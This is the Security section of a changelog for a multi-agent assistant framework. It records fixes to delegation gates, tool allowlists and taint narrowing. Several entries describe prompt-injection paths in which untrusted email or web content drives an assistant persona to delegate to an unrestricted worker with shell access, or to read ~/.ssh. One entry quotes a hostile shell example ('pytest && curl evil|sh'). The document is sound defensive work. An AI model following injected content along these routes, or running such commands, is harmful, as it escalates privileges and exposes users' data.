Security

- **`izzie`, `personal-assistant` and the base `assistant` no longer reach
  `git_log`/`git_status`.** PR #4222 gave L0-tier agents cross-project git
  scoping and ADR-0024 decision 3 (PR #4296) made an undeclared `tier =`
  derive from agent kind, so assistant-kind personas resolve L0 — together
  moving those two tools from a single-tenant git surface to a cross-project
  one bounded only by the operator's `projects.json`. `izzie` ingests
  untrusted content (Gmail, Drive, Calendar), which left untrusted input one
  hop from a cross-project read primitive: a prompt-injection exfiltration
  shape. Read-only and registry-bounded throughout, but the reach was new and
  unintended. Removing the entries from izzie's own two files was NOT
  sufficient — `izzie/agent.toml` declares `extends = "assistant"` and
  `merge_extends` UNIONS `[tools].allow` base-first with no subtractive key,
  so the base kept re-granting them; `assistant/agent.toml` had to drop them
  too. `cto-assistant` re-declares all four git tools itself as a deliberate
  carve-out (it is a coding assistant, not a mail-ingesting one) and keeps an
  unchanged surface. Pinned by `bundled_personas_pin_git_reach`, which
  resolves personas through the real loader rather than reading TOML — a
  file-reading test would have gone green while the inherited grant stayed.
- **Delegation authority is now governed by agent KIND, not by tier order
  (ADR-0024, "Assistants Are Level-0 Delegators; Sub-Agents Are In-Process,
  Single-Edge Leaves That Never Delegate" — cited by title as well as number
  because the ADR is not on `main` yet; it lands with PR #4243).** The
  shipped L0/L1 gate expressed its rule as a tier
  comparison, which is a proxy: a total order cannot forbid an edge WITHIN a
  rank, for any numbering. It appeared to work only because every assistant
  was L1 and L0 was empty. Under the ratified model — where all assistants
  become L0 and "assistants communicate with each other, but never delegate"
  — that check becomes vacuous for exactly the case it must forbid, and no
  renumbering fixes it. `DelegateToAgentTool::execute` now refuses any
  assistant-to-assistant delegation edge by reading the two endpoints' `role`
  (the KIND discriminator), never a tier. The check lives in the shared
  `execute()` choke point every delegation traverses rather than in a
  per-call-site builder method, and the delegator's role and tier are declared
  through a single `with_delegator(role, tier)` call (superseding
  `with_delegator_tier`), so no construction site can acquire one gate while
  silently missing the other — the failure shape the persona-path fix above
  was filed for. The tier gate is RETAINED unchanged as defense-in-depth over
  a different config field. `pm`/`ctrl`-as-orchestrator are explicitly outside
  this rule and are unaffected. The `GET /api/agents/:name/subagents` route
  reports peer assistants as unreachable with the kind reason, reading the
  same predicate the gate enforces rather than a second copy of it.

  **Known regression, accepted by the owner:** this closes the Izzie <->
  cto-assistant peer-consult lane, and the replacement mechanism
  ("assistants communicate") does not exist yet — there is no implemented
  agent-to-agent messaging path for trusty-agents personas today.

- **Applied the `ASSISTANT_ALLOWED_DELEGATE_ROLES` gate on the persona-chat
  dispatch path (#4201).** The REPL `/agent` persona path built its
  `DelegateToAgentTool` with the #4169 L0/L1 tier gate but WITHOUT the role
  allowlist its sibling ctrl/session path applies, so an assistant-tier
  persona could delegate to `pm` (role `orchestrator`) or `ctrl` (role
  `controller`) — roles that are not in the allowlist at all — and
  `run_subagent` would arm the spawned subprocess from that child's own role,
  handing an unrestricted orchestrator registry (shell, `write_file`,
  unrestricted `delegate_to_agent`) to a persona that ingests untrusted
  content. The tier gate did not cover for it: it can only refuse an
  `L0Orchestration` TARGET and no bundled agent declares `tier = "l0"` today,
  so on this path both defense-in-depth layers were ineffective. Both gates
  are now applied from one place (`persona_gate::build_persona_delegate_tool`,
  reusing the same single-source-of-truth constant the other paths use), which
  the regression tests drive directly so a call-site regression cannot pass
  silently. A persona whose own role is outside the assistant tier is
  unaffected.

- **Defined the L0/L1 persona privilege tier and made the L1->L0 delegation
  path structurally forbidden (#4168, #4169, epic #4167).** Added an
  explicit `AgentTier` (`AgentInfo::tier`, TOML `[agent].tier` / `.md`
  frontmatter `tier`), decoupled from `role`, that fails closed to
  `L1Standard` on an absent, blank, or unrecognized value — never `L0`.
  `delegate_to_agent` now refuses any call where the resolved TARGET's tier
  is `L0Orchestration` unless the DELEGATOR's own tier is also
  `L0Orchestration`, checked at every dispatch path that can construct a
  `DelegateToAgentTool` (the `--direct`/`--agent` subprocess path, the
  persona-chat REPL path, and the ctrl history/session path), including
  through a peer-assistant delegation hop — no chain of L1 hops can reach
  L0. This PR defines the tier and the boundary only; it grants L0 no new
  capabilities and creates no L0 persona instance (those are #4170-#4173).

- **Closed a prompt-injection-to-arbitrary-code-execution path through
  `delegate_to_agent` (#4126).** An assistant-tier persona (`assistant`,
  `cto-assistant`, `izzie`) holding live external-content tools
  (`get_gmail_message_content`, `web_search`, …) plus `delegate_to_agent`
  could be driven by attacker-controlled fetched content to delegate an
  attacker-authored task to `engineer` — a worker role with no
  `[tools].allow` at all — and the spawned `claude-code` subprocess got its
  full unrestricted tool surface (shell, file write) with no narrowing,
  because the existing `scope_assistant_allowed_tools` gate only narrowed a
  spawn when the SPAWNED agent's own role was `"assistant"`. Every
  assistant-tier `delegate_to_agent` call now tags its spawn with the
  delegator's own `[tools].allow` posture (`SubprocessAgentRunner::
  with_delegation_taint`); the spawned worker's registry is narrowed to that
  posture regardless of its own declared role, on both dispatch paths (the
  `--direct`/`--agent` subprocess path and the in-process `/agent`
  persona-chat path). A malformed/corrupted taint value fails CLOSED
  (deny-all), never silently untainted. Narrowing is logged on both the
  parent (pre-spawn) and child (post-scoping) sides, and a disallowed tool
  call already returned (and continues to return) a legible
  "not permitted for this agent" error rather than a silently-missing tool.

- **Follow-up hardening for the `delegate_to_agent` taint fix above (#4126):
  closed a multi-hop composition gap, added a fail-closed default, and
  covered a third, previously-unpatched dispatch path.** (1) At hop 2+
  (`assistant -> izzie -> engineer`), both dispatch paths forwarded the
  INTERMEDIATE agent's own native `[tools].allow` as the outbound taint
  instead of intersecting it with the INBOUND taint it had itself received —
  a taint could widen back out instead of only ever narrowing. A new
  `compose_delegation_taint` helper is now the single place both paths
  compute the outbound taint, always as an intersection. (2) An
  assistant-tier agent reached with no taint AND no resolvable
  `[tools].allow` previously fell through to fully unrestricted; it is now
  denied every tool by default. (3) `run_pm_task_with_history` — the path
  backing the REPL, Slack, Telegram, and the API server, and `ctrl.toml`
  (the standalone default) declares `role = "assistant"` per #3812 — built
  its `DelegateToAgentTool` with no taint and no target-role gate at all,
  reproducing #4126's exact exploit shape on the default path; it now
  applies the same taint and `ASSISTANT_ALLOWED_DELEGATE_ROLES` gate as the
  other two dispatch paths (`pm`/orchestrator-role callers are unaffected).
- **A skill manifest can no longer launder a wildcard tool grant (#3933):**
  `tools:` entries in an authored `.md` were taken verbatim and merged into the
  patterns `match_any_glob` consumes, which reads a trailing `*` as a prefix
  wildcard. A skill file declaring `tools: ["*"]` — ordinary content in any
  skill source, not reviewed like `agent.toml` — would therefore let one
  innocuous `[skills].allow` id carry `[tools].allow = ["*"]` authority behind a
  card rendering as a single narrow capability. That is strictly worse than the
  raw glob it replaces, because the reviewer reading `agent.toml` sees a tidy
  skill id and no wildcard at all. DOC-57 S-1 already required exact names;
  nothing enforced it. Glob metacharacters (`*`, `?`, `[`, `]`), empty names and
  padded names are now rejected at three independent layers — manifest parse,
  catalog insert, and expansion — and a manifest with any invalid entry is
  dropped whole (loudly logged) rather than silently narrowed to its valid half.
  Found by code-critic on PR #3964; mutation-verified.
- **`okg_ingest_docstore` is confined on the READ side.** Its `path` was a
  free-form model-supplied string with only an `is_dir()` check, which made the
  default base assistant — and every persona extending it — capable of reading
  arbitrary local files (`/etc`, `~/.ssh`) into a searchable KB. Paths are now
  checked against `[okg] docstore_roots` before registration AND again inside
  the engine on every run, so a poisoned registry row cannot replay the read.
- **`pytest_exec` (`ShellExecTool`) no longer executes through a shell (#3679):**
  the allowlist previously vetted only the command string's leading prefix,
  then handed the whole, unmodified string to `/bin/sh -c` — anything after
  the recognized prefix (`pytest && curl evil|sh`) was live shell syntax, a
  full arbitrary-command-execution hole in what's documented as the QA
  agent's sandbox. `resolve_allowed_argv()` now quote-aware tokenizes the
  command and requires the entire leading token sequence to exactly match a
  known test-runner invocation (whole-token comparison, never a string
  prefix, so `pytest-evil` cannot pass as `pytest`), and `execute()` runs the
  resolved argv directly via `Command::new(program).args(rest)` with no shell
  spawned at all — the actual fix, since any metacharacter that slipped
  through validation would now just be an inert argv element. A trailing
  `2>&1` (the one shell-redirection form the QA prompt emits) is stripped as
  a no-op carve-out rather than passed through a shell. Pre-existing on
  `main`, found during #3466 adversarial review and deliberately deferred to
  this dedicated fix.

- **Assistant no longer leaks internal orchestration or disclaims delegating
  when dispatched via `--direct`/`--agent` (#3550 follow-up):** a live smoke
  test (`tagent --direct assistant --task "..."`) proved the black-box/tool
  hardening from PR A (epic #3052, below) did NOT cover this dispatch path —
  it still leaked `trusty-mpm`, `subagent`, and `subprocess`, recited the
  entire bundled skill catalog ("wave planning", "git worktree discipline",
  the full engineering language/framework bench), and disclaimed delegating
  ("not a coding agent myself", "I'd hand off... rather than writing code
  myself"). Root cause: `--direct`/`--agent` route through `run_subagent`
  (`src/runtime/subagent_mode.rs`), a SEPARATE dispatch path from the
  persona-chat path (`run_pm_task_with_persona`) PR A actually hardened.
  `run_subagent` treated every agent — including `role == "assistant"`
  personas — as a generic coding sub-agent:
  - `SystemPromptBuilder::walk_project_instructions` unconditionally injected
    every ancestor `CLAUDE.md`/`AGENTS.md` verbatim, including this crate's
    own `CLAUDE.md` (which literally documents "PM Orchestrator", "Sub-Agent
    Process", "subprocess IPC") and the workspace root `CLAUDE.md`
    (`trusty-mpm`, worktree/PR-workflow conventions).
  - The binary's coding-harness protocol (`agents::harness_protocol::
    BASE_PROTOCOL` — "## trusty-agents Harness Protocol", `out_dir`,
    "workflow phases") was injected regardless of role, priming the model to
    describe itself as a phase-based coding harness.
  - `build_registry_for_agent`'s catch-all branch (`src/runtime/
    tool_registry.rs`) unconditionally wired `list_skills`/`load_skill` to
    the FULL tag-indexed skill registry (every language/framework/workflow
    skill, including `workflow/wave-planning.md` and `workflow/
    delegation.md`) with no restriction: `run_subagent_with_tools` gates
    tool reachability on `cfg.tools.allowed` (an exact-name list), but
    persona TOMLs declare `[tools].allow` (glob patterns) instead — a field
    this path never read — so `allowed` stayed `None`, which
    `chat_with_tools_gated` treats as unrestricted.

  Fixed with a role-scoped gate (`ASSISTANT_TIER_ROLE = "assistant"`,
  matches `AgentInfo.role` — covers `assistant`/`cto-assistant`/`izzie`/
  `personal-assistant` uniformly, independent of display name) in
  `run_subagent`: skips the CLAUDE.md walk and harness-protocol layers for
  assistant-tier agents, routes registry construction to a new curated
  `build_assistant_tier_registry` (delegation + read-only git/web lookups,
  no catalog-browsing tools), and adds `scope_assistant_allowed_tools` to
  translate `[tools].allow` glob patterns into the `[tools].allowed`
  exact-name list the existing gate enforces. Engineer/qa/research/docs/ops/
  plan/pm/ctrl dispatch is untouched — the gate only fires for
  `role == "assistant"`.

  `assistant/persona.md`, `izzie.toml`, and `personal-assistant.toml`'s
  "What you are not — Not a coding agent" sections were reworded from an
  identity-negation frame (which the model was echoing near-verbatim as
  "I'm not a coding agent myself") to a positive delegation-ownership frame
  ("you own getting it done, by delegating it") that explicitly forbids the
  disclaiming phrasing.

  New tests: `assistant_tier_registry_excludes_skill_catalog_tools`,
  `assistant_tier_registry_includes_curated_tools`,
  `role_takes_precedence_over_name_for_assistant_tier`,
  `scope_assistant_allowed_tools_filters_by_glob`,
  `scope_assistant_allowed_tools_noop_for_non_assistant`,
  `scope_assistant_allowed_tools_noop_when_allowed_already_set`
  (`src/runtime/tool_registry_tests.rs`).

- **`delegate_to_agent` no longer leaks internal agent names (PR A code-critic
  fix, epic #3052):** granting `delegate_to_agent` to assistant-tier personas
  (see below) exposed two leaks in the shared tool implementation
  (`src/tools/delegate.rs`), sent to the LLM on every turn / every failed
  delegation regardless of caller:
  - The tool's schema `description` hardcoded concrete internal agent-name
    examples (`'engineer', 'python-engineer', 'qa-agent'`) — generalized to
    describe the parameter generically ("the specialist to hand this task
    to"). `pm` is unaffected: it gets its roster via its own system prompt's
    `{{available_agents}}` template substitution
    (`agents::registry::roster::inject_roster_into_prompt`), independent of
    this schema.
  - An unknown `agent_name` returned "Unknown agent 'x'. Available agents:
    &lt;full on-disk roster&gt;." — the roster enumeration is now dropped;
    the error just names the caller's own rejected input ("'x' is not a
    recognized specialist. Check your own instructions...") without
    enumerating the config directory. The now-unused `available_agents()`
    roster-listing helper was removed.
  - **Functional companion fix:** the black-box strip left the assistant
    with `delegate_to_agent` but no idea which `agent_name` values are
    legitimate. `assistant/persona.md` gains a curated "Internal specialist
    routing" list — `engineer`, `python-engineer`, `qa-agent`,
    `research-agent`, `docs-agent`, `local-ops-agent`, `plan-agent` (the
    general-purpose WORKER agents; excludes meta/infra agents `ctrl`/`pm`/
    `observe-agent`/`postmortem-agent` and model-variant engineers
    `bedrock-engineer`/`claude-code-engineer`/`code-agent`/`gpt-engineer`/
    `gpt5-codex-engineer`) — marked explicitly as internal-only knowledge:
    the assistant may use these names to decide who to call, but must refer
    to the user only by role ("an engineer", "a QA specialist"), never by
    the internal name. The same list + the full black-box "NEVER reveal
    internal mechanics" section were ported into the two shadow-fallback
    files (`izzie.toml`, `cto-assistant.toml`) that previously got the tool
    grant + mcp-strip but not the black-box prose; `personal-assistant.toml`
    (no `delegate_to_agent` grant, doesn't `extend` `assistant`) gets a
    scope-note comment instead, documenting the deferral rather than leaving
    it ambiguous.
  - **Bug found + fixed along the way:** `izzie/agent.toml`'s
    `extends = "assistant"` key was placed BEFORE the `[agent]` table
    header, making it a top-level TOML key. `AgentConfig` has no top-level
    `extends` field (only `AgentInfo::extends`) and doesn't
    `deny_unknown_fields`, so serde silently dropped it — `izzie` never
    actually inherited anything from the base (no prose concatenation, no
    tool/skill union) despite every comment in the file claiming otherwise;
    it "worked" only because izzie's own redundant declarations happened to
    duplicate the base's values. Moved `extends` inside `[agent]`, where the
    schema expects it — caught by a new pinning test that failed exactly
    because the base's persona body (this PR's routing list) never reached
    izzie's resolved content.
  - New/updated tests: `unknown_agent_is_rejected_without_naming_the_agent_or_roster`
    (`src/tools/delegate.rs`, invokes `DelegateToAgentTool::execute()` with a
    bad name against a config dir seeded with a realistic worker + meta/infra
    roster, asserts none of it leaks),
    `assistant_tier_persona_carries_curated_worker_routing_list`
    (`src/agents/tests/loading.rs`, resolves `assistant`/`izzie`/
    `cto-assistant` and asserts the routing list + black-box reminder are
    present), and `izzie_overlay_package_parses_with_personal_deltas`
    corrected to assert the NOW-CORRECT real-inheritance behavior (it
    previously asserted the absence of inheritance, which was the bug).
- **CRITICAL — privilege escalation via unrestricted assistant-tier
  delegation target, closed with a fail-closed role allowlist (#3555
  follow-up, code-critic):** widening `delegate_to_agent`'s pre-flight
  validation to the full `agents_dir_candidates()` multi-tier search (the fix
  directly above) had an unreviewed consequence — it made the ENTIRE bundled
  roster resolvable from an assistant-tier call regardless of cwd, including
  `pm` (role `orchestrator`), `ctrl` (role `controller`), `observe-agent`
  (role `observer`), and `postmortem-agent`/`analysis-agent` (role
  `analysis`). `run_subagent`'s tool registry is built from the SPAWNED
  child's own role, so an assistant delegating to `pm`/`ctrl` would have
  handed the resulting subprocess an UNRESTRICTED orchestrator/controller
  registry (shell, `write_file`, unrestricted `delegate_to_agent`) — an
  escalation straight out of the sandboxed assistant tier, reopening the
  internal-orchestration-leak class PR A (epic #3052) closed.
  - `DelegateToAgentTool` (`src/tools/delegate.rs`) gained
    `allowed_target_roles: Option<Vec<String>>` and a
    `with_allowed_target_roles` builder. When set, `execute()` resolves the
    TARGET's `AgentConfig` (via `config_dirs`) and requires its resolved
    `agent.role` to be in the allowlist — checked BEFORE the runner is ever
    invoked. Both "unknown agent name" and "role not allowed" return the
    IDENTICAL generic error text, so neither leaks which case occurred or any
    role taxonomy. `pm`/`ctrl` never call this builder — the full roster
    remains a legitimate delegation target for them, completely unaffected.
  - `build_assistant_tier_registry` (`src/runtime/tool_registry.rs`) now
    wires a new `ASSISTANT_ALLOWED_DELEGATE_ROLES` constant: the exact `role`
    field values of the bundled worker agents (`engineer`, `qa`,
    `researcher`, `documentation`, `ops`, `planner`) plus `ASSISTANT_TIER_ROLE`
    itself — so the Izzie ↔ cto-assistant peer-consult lane keeps working
    (spawning a peer assistant is safe: it's routed through the SAME
    restricted `build_assistant_tier_registry`, never an unrestricted one).
    Any other role — orchestrator, controller, observer, analysis, or
    anything undeclared — is rejected.
  - New tests: `delegate_assistant_role_gate_rejects_orchestrator_role`,
    `delegate_assistant_role_gate_rejects_controller_role`,
    `delegate_assistant_role_gate_allows_worker_role`,
    `delegate_assistant_role_gate_allows_peer_assistant_role`, and
    `delegate_without_role_gate_allows_any_resolvable_role` (pins that
    pm/ctrl are unaffected) — all in `src/tools/delegate.rs`. A `#[ignore]`d
    live-wiring test, `runtime::tool_registry::registry_tests::
    live_assistant_registry_rejects_pm_role`, exercises the REAL
    `build_assistant_tier_registry()` against whatever roster is actually
    deployed at `$HOME/.trusty-agents/agents/` (manual verification aid, not
    a CI gate — CI's `$HOME` may have no deployed roster at all).
  - Live-verified: the REAL production registry (built from the machine's
    actual deployed `$HOME/.trusty-agents/agents/pm.toml`, role
    `orchestrator`) rejects `delegate_to_agent(agent_name="pm")` without
    invoking the runner, while a real `engineer` delegation still spawns and
    completes normally.
- **Assistant-tier tool black-box strip (PR A, epic #3052):** removed
  `session_list`, `session_status`, `session_send`, `project_list`,
  `console_metrics` (trusty-mpm proxied tools), `system_status` (enumerates
  daemon names including "trusty-mpm"), `mcp_list`/`mcp_enable`/`mcp_disable`
  (enumerate MCP service names), and `agent_delegate` (trusty-mpm's, distinct
  from the native `delegate_to_agent`) from every assistant-tier
  `[tools].allow` list (`assistant`, `izzie` (package + flat shadow),
  `cto-assistant` (package + flat shadow), `personal-assistant`) so a
  conversational assistant persona can no longer name-drop internal
  trusty-* system/daemon architecture to the user. These tools remain
  reachable to `pm`/`ctrl`/`research`/`observe` roles via their own scoping —
  unaffected by this change. A pinning test
  (`assistant_tier_grants_delegation_and_blackboxes_internal_tools`,
  `crates/trusty-agents/src/agents/tests/loading.rs`) asserts the resolved
  `[tools].allow` for `assistant`/`izzie`/`cto-assistant` includes
  `delegate_to_agent` and excludes every black-boxed name.

- **Loopback-only doctrine (#3329):** the HTTP API server (`--api`/`--serve`)
  now binds `127.0.0.1` by default instead of `0.0.0.0`. A non-loopback bind is
  an explicit opt-in via the new `--bind <addr>` flag, and the server **refuses
  to start** on a non-loopback interface unless an API token is set
  (`--api-token` / `TAGENT_API_TOKEN`) — the error points operators at the
  trusty-console proxy (`/api/agents/*`) as the intended remote path. The API
  can spawn arbitrary subprocesses, so an unauthenticated LAN-reachable bind was
  a real exposure. Additionally adopts the shared same-origin write guard
  (`trusty_common::server::with_guarded_middleware`, mirroring #3317) router-wide
  so cross-origin browser writes (CSRF) to `POST /api/task`, the `/api/tm/*`,
  `/api/ctrl/*`, and `POST /rpc` surfaces are rejected with 403; GET reads, the
  `/api/events` SSE stream, and same-origin/loopback writes are unaffected. The
  agents-ui webview keeps working: in Tauri desktop mode writes travel over
  Tauri IPC (never HTTP), and in browser mode the SPA is served same-origin
  loopback. Replaces the crate-local CORS/compression/trace stack with the
  shared standard middleware so trusty-agents no longer drifts from the sibling
  trusty-* daemons.
